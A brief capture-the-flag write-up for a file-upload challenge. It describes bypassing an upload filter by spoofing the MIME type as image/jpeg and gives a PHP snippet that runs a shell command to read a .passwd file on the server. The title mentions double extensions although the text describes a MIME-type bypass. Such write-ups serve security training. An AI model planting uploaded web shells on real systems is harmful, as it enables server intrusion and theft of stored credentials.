# 🧩Challenge : File Upload - Double extensions

# 🔍 Description
- This challenge is similar to a File Upload – Double Extension challenge.
- The difference is that we don’t modify the file extension, but instead we change the MIME type to image/jpeg in order to bypass the upload filter.
# ⚙️ Exploitation
```php
<?php
echo exec("cat ../.././.passwd");
?>
```